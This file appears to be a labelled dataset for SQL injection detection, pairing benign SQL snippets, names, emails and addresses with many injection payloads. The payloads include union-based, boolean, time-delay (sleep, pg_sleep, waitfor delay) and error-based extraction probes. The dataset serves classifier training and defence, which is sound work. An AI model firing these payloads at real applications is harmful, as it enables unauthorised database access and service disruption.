payload	label
   SELECT Employees.carry, COUNT ( Orders.referID )  AS dreamFROM    ( OrdersINNER JOIN explanation ON Orders.blowID  =  Employees.exerciseID ) 	0
1'   )    )    as xjen where 6791  =  6791 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --	1
SELECT TOP 3 * FROM forty SELECT * FROM movie 3SELECT * FROM like	0
SELECT * FROM settlers WHERE lonely = 'brought' FETCH FIRST 3 ROWS ONLY	0
nufrago	0
29%	1
SELECT Count ( * )  AS language	0
cadenat.mulich@4ghz.do	0
mamakos@palodegolf.com.rw	0
5956390000000000	0
SELECT * FROM enemy WHERE torn = 'village'  AND City = 'safety'	0
c/ dau 100, 10-a	0
coca de alba	0
1'  )   where 5331  =  5331	1
moneder-a	0
"1%""   )    )     )   and make_set  (  8191  =  7813,7813  )   and    (    (     (  ""%""  =  """	1
SELECT * FROM excitement FETCH FIRST 50 PERCENT ROWS ONLY	0
1  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
1'||  (  select 'sbft' where 8748  =  8748	1
c/ academia, 59, 3?g	0
 select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1	1
-8328 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # rlva	1
SELECT thing ( s )  FROM exact LEFT JOIN	0
edilio	0
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz	1
"SELECT DATE ( ""2017-06-15 09:34:21"" ) ;"	0
SELECT AVG ( aid ) FROM corner	0
-2429%' or 6890  =  5846	1
   SELECT COUNT ( printed ) , zoo FROM struggle BY dish	0
1'+  (  select pdfv where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'	1
"1""  )   where 9545  =  9545 and 9198  =  9198--"	1
"-4165"" where 1772  =  1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--"	1
SELECT AVG ( battle ) FROM shape SELECT SUM ( struggle ) 	0
1 rlike sleep  (  5  )  -- muhp	1
trampeador	0
1%'   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#	1
"-9944""   )    )    or 8537  =  2039 and    (    (   ""kfzj""  =  ""kfzj"	1
franks.merayo@karldeux.ki	0
"  SELECT DAYOFMONTH ( ""2017-06-15"" ) ;"	0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'kerg' like 'kerg	1
1'  )   as bdei where 9531  =  9531 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
zauhar	0
select pg_sleep  (  5  )   and 'rpka'  =  'rpka	1
elwes@enla.nu	0
"1"" where 4161  =  4161 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"	1
80igm94016	0
3549370000000000	0
SELECT * FROM neck WHERE his BETWEEN 'toward' AND 'shelf'	0
-9653'  )   where 2705  =  2705 or 9323  =  9323#	1
SELECT * FROM thought FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT COUNT ( thouID ) FROM chamber	0
84304826m	0
SELECT column1, column2, ... FROM table_name WHERE columnN LIKE pattern ;	0
SELECT COUNT ( DISTINCT learn )  FROM customs	0
armenteros	0
c/ hermanos pinzon 178	0
-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--	1
herminia	0
vilanova de segri	0
holgorio	0
select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #	1
SELECT * FROM book  WHERE house NOT LIKE '[bean]%'	0
for26same8te	0
1'   )    )    as fwxq where 9935  =  9935 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --	1
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf	1
81338514a	0
puges crcamo	0
SELECT * FROM smoke WHERE chief NOT LIKE '[ought]%'	0
llinars del valls	0
1  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --	1
7750000000000000	0
fuentes calientes	0
SELECT * FROM popular WHERE further BETWEEN 'hot' AND 'transportation'	0
  UPDATE bark SET few =  'vapor', City =  'subject' WHERE alphabet =  pretty	0
26562587w	0
SELECT * FROM troops WHERE equal NOT LIKE '[bright]%'	0
fazenda_heigh@unanuevavisionenortodoncia.gh	0
"calle poligon industrial ""el segre"", 118"	0
"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq"	1
sqlattempt1	1
9464	0
SELECT yellow ( s )  FROM knowledge SELECT ocean FROM audience	0
SELECT * FROM had 3	0
SELECT * FROM very WHERE yard = 'glass'  OR couple = 'however'	0
"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   "	1
 SELECT column_name ( s )  FROM show,solve	0
SELECT * FROM riding WHERE firm = 'feet'  OR recall = 'may'	0
SELECT * FROM famous WHERE enter NOT LIKE '[song]%'	0
SELECT visitor FROM studying	0
SELECT * FROM herself  WHERE wagon NOT LIKE '[fallen]%'	0
"1""   )    )    as mlid where 1047  =  1047 union all select null,null#"	1
SELECT TOP 50 PERCENT * FROM walk	0
edelmar	0
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """	1
SELECT TOP 3 * FROM least WHERE cook = 'wolf'	0
"1%""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """	1
yeladaky janeiro	0
surai	0
eyre9@ringringcargo.tn	0
c/ moriles 91	0
SELECT MIN ( choice )  AS play FROM extra	0
DELETE FROM check WHERE carry = 'yet'	0
37724	0
 SELECT column_name ( s )  FROM location,arrangement	0
cuerlas, las	0
descrieres@enibiza.com.ac	0
"  SELECT REPLACE ( ""SQL Tutorial"", ""SQL"", ""HTML"" ) ;"	0
SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'wp_theme' )  AND t.name IN  ( 'houzez-child' ) 	0
  SELECT * FROM hospital WHERE girl IN  ( 'however', 'most', 'milk' )  	0
calle manuel de falla, 65 5?a	0
humfrey	0
1  )   union all select null,null,null,null,null--	1
1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
1'   )    )     )   union all select null,null,null--	1
1  )   as zdym where 1578  =  1578 union all select null,null,null#	1
tardguila	0
SELECT * FROM to WHERE dull BETWEEN '1996-07-01' AND '1996-07-31'	0
select * from generate_series  (  3180,3180,case when   (  3180  =  4445  )   then 1 else 0 end  )   limit 1--	1
select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  1321  =  1321	1
-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--	1
brewer	0
nicole-meyer@creacionesdolcevita.us	0
-8002'   )    )     )   union all select 6647,6647,6647--	1
-2817%'  )   or 8255  =  3841--	1
escusaa	0
livio	0
select   (  case when   (  9388  =  4322  )   then 1 else 9388*  (  select 9388 from master..sysdatabases  )   end  )  --	1
calle benifallim 97 10?e	0
DELETE FROM consider WHERE storm = 'stove'	0
pearce	0
select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq	1
SELECT * FROM additional WHERE writing NOT BETWEEN 'any' AND 'peace'	0
litago	0
1',  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )   	1
SELECT correctly ( s ) FROM wave INNER JOIN	0
SELECT * FROM crack	0
SELECT TOP 3 * FROM volume	0
bablica	0
 SELECT column_name ( s )  FROM simple,discuss	0
SELECT handle ( s )  FROM occur UNION	0
-6081 where 3681  =  3681 or 2603  =  3138--	1
-8625 or 3176  =  2519# fvgl	1
mandruso	0
1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   	1
1'||  (  select 'rask' from dual where 9411  =  9411 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'	1
1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||'	1
paula	0
  SELECT Orders.experimentrID, Employees.why, Employees.biggest FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.describeID ORDER BY Orders.instrumentID	0
SELECT * FROM grain  WHERE tongue NOT LIKE '[automobile]%'	0
1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  	1
   SELECT Employees.visitor, COUNT ( Orders.purposeID )  AS shallowFROM    ( OrdersINNER JOIN hung ON Orders.policemanID  =  Employees.recentID ) 	0
c/ la paloma, 32 12-a	0
  SELECT careful,tail,weight FROM wrote LEFT JOIN Orders ON eager.dogID =  past.fine ORDER BY recent.tea	0
 SELECT * FROM brave ORDER BY detail ASC, wish DESC	0
apotrerar	0
  SELECT familiarID AS ID, ancient AS daughter FROM paper	0
 SELECT column_name ( s )  FROM slight,according	0
SELECT * FROM temperature WHERE including = 'adventure'  OR be = 'gradually'	0
1'||  (  select 'svgd' from dual where 5188  =  5188 union all select null,null,null,null,null#	1
palacio@eldeseodepecar.kn	0
1'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
legrandv	0
1,  (  select   (  case when   (  9644  =  9644  )   then dbms_pipe.receive_message  (  chr  (  75  )  ||chr  (  78  )  ||chr  (  104  )  ||chr  (  98  )  ,5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  	1
SELECT * FROM instance WHERE planet  BETWEEN 10 AND 20	0
SELECT * FROM shut WHERE five = 'combine'  OR wore = 'put'	0
1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --	1
  SELECT scale AS explore, three AS [slipped]  FROM chose	0
rowen	0
SELECT COUNT ( bone )  FROM power	0
toolbox	0
  SELECT needed AS duck, fire AS [automobile]  FROM throughout	0
"1"" union all select null,null,null#"	1
SELECT DISTINCT energy FROM smooth	0
SELECT AVG ( excited ) FROM industry SELECT SUM ( mouse ) 	0
peluffo1@psicoencuentronline.va	0
1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   	1
"1"" where 7015  =  7015"	1
"1%"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """	1
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1"	1
 UNION ALL SELECT	1
manquel	0
SELECT COUNT ( sweet ) FROM lonely	0
"-4798""   )    )     )   union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#"	1
SELECT MIN ( symbol )  AS while FROM hurried	0
1'  )   as ghvi where 3880  =  3880 and 4595  =  4595#	1
glickman	0
SELECT * FROM to WHERE pot = 'worker' FETCH FIRST 3 ROWS ONLY	0
7861650000000000	0
"1%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""%""  =  """	1
  UPDATE sale SET jar =  'shorter', City =  'chain' WHERE occur =  ordinary	0
   SELECT Employees.canal, COUNT ( Orders.properID )  AS meetFROM    ( OrdersINNER JOIN height ON Orders.factorID  =  Employees.freeID ) 	0
"-6803""  )   order by 1#"	1
  SELECT City, Country FROM CustomersWHERE Country = 'Germany'UNION ALL SELECT City, Country FROM Suppliers	0
3553	0
agres	0
1 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
1272	0
SELECT * FROM bar	0
lahnstein agundis	0
 SELECT Customers.CustomerName, Orders.OrderID INTO CustomersOrderBackup2017 FROM Customers  LEFT JOIN Orders ON Customers.CustomerID  =  Orders.CustomerID;	0
-4381 or make_set  (  6118  =  3095,3095  )  # lkcr	1
select   (  case when   (  3076  =  3596  )   then 3076 else 3076*  (  select 3076 from mysql.db  )   end  )  #	1
"1%""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """	1
-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#	1
SELECT known ( s )  FROM usually	0
1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'ibav'  =  'ibav	1
 select * from users where id  =  1 + @`\` union select 1,version  (    )   -- 1	1
1  )   as ktfu where 2637  =  2637	1
   SELECT important,bottom,activity,length,team     (  (  from JOIN eleven ON exist.active =  rate.should )   INNER JOIN protectionON Orders.badly =  than.awareID ) 	0
els	0
1' in boolean mode  )   and 3787  =  7750--	1
"1"" where 3510  =  3510"	1
azema.alvir@telogis.gf	0
SELECT * FROM managed WHERE away = 'married'  OR valuable = 'grandfather'	0
" select * from users where id  =  1 or 1#""; union select version  (    )  ,version  (    )   -- 1"	1
SELECT AVG ( alphabet )  FROM image  SELECT SUM ( company ) 	0
1   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4090  =  4090	1
espartero, 103, 5-f	0
1%' and elt  (  4249  =  4249,7259  )   and '%'  =  '	1
maclaren	0
1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
-2734'  )   union all select 5510,5510,5510,5510,5510#	1
44368	0
ajaraca	0
  UPDATE vapor SET pile =  'return', City =  'land' WHERE solve =  longer	0
1' where 9003  =  9003 waitfor delay '0:0:5'--	1
SELECT AVG ( Price ) FROM task	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28635 )  ORDER BY meta_id ASC	0
SELECT * FROM laid WHERE NOT further = 'accident'  AND NOT perhaps = 'cup'	0
SELECT prevent ( s )  FROM saw	0
-3520%' or 8571  =  8571--	1
mola guell	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239189 )  ORDER BY meta_id ASC	0
   SELECT COUNT ( donkey ) , before FROM parallel BY of	0
"-2149""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""hoon"" like ""hoon"	1
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymwb""  =  ""ymwb"	1
SELECT writer ( s FROM black RIGHT JOIN	0
SELECT * FROM summer WHERE jungle IN  ( SELECT push FROM fence ) 	0
SELECT shallow ( s )  FROM label LEFT JOIN	0
8arrascal485	0
 select * from users where id  =  1 union select @<@$,version  (    )   -- 1	1
SELECT * FROM chance WHERE similar = 'pile'	0
 select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1	1
4.38114E+015	0
6988630000000001	0
  SELECT fellow,fact FROM manufacturing WHERE handsome = 'better' UNION SELECT fireplace, result FROM lamp	0
SELECT * FROM energy WHERE alive = 'arm'  OR cross = 'track'	0
1 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --	1
"-7635"" union all select 1284,1284,1284,1284,1284,1284#"	1
SELECT * FROM port WHERE yourself = 'season' LIMIT 3	0
SELECT * FROM closely FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sum	0
"1""   )    )     )   union all select null,null,null,null,null,null,null--"	1
SELECT hearing FROM local UNION SELECT short FROM film ORDER BY show	0
1'   )    )    as qqvk where 1007  =  1007	1
-3304'   )    )    order by 1--	1
"-4849""   )    )    or   (  5005  =  9111  )  *9111 and    (    (   ""catv"" like ""catv"	1
thibaut	0
1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '	1
SELECT * FROM  ( SELECT numeral FROM easy ) 	0
SELECT * FROM earth WHERE duty = 'sign'  AND City = 'loose'	0
5975280000000000	0
SELECT AVG ( half ) FROM balance SELECT SUM ( break ) 	0
8025250000000000	0
SELECT * FROM using 3	0
sant andreu salou	0
8912	0
"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #"	1
"1""  )   as ranl where 5553  =  5553"	1
34239	0
  UPDATE needle SET draw =  'zoo', City =  'wealth' WHERE fill =  relationship	0
 UPDATE close SET toy = 'anyone'WHERE sail = 'hill'	0
"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"	1
  SELECT * FROM string WHERE stranger NOT IN  ( 'swim', 'art', 'arrive' )  	0
"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""dhss""  =  ""dhss"	1
SELECT store ( s )  FROM mail	0
SELECT else ( s FROM since RIGHT JOIN	0
45790	0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--"	1
"1%""   )    )    and 8316  =  6410#"	1
thuong	0
1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --	1
SELECT * FROM pencil FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM secret	0
1'   )    )    and 4595  =  4595#	1
luciano nagel	0
-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#	1
SELECT * FROM rope	0
19338	0
1534180000000000	0
select   (  case when   (  9907  =  2736  )   then 9907 else 9907*  (  select 9907 from mysql.db  )   end  )  #	1
45643261z	0
SELECT AVG ( window )  FROM simply  SELECT SUM ( thick ) 	0
 SELECT * FROM cheese ORDER BY tone, personal	0
SELECT * FROM connected WHERE game = 'breeze'  OR barn = 'clothes'	0
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr"	1
"  SELECT MONTHNAME ( ""2017-06-15"" ) ;"	0
fest lairigoyen	0
"1""  )   union all select null,null,null,null,null,null,null,null#"	1
"-5513""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""ovmk"" like ""ovmk"	1
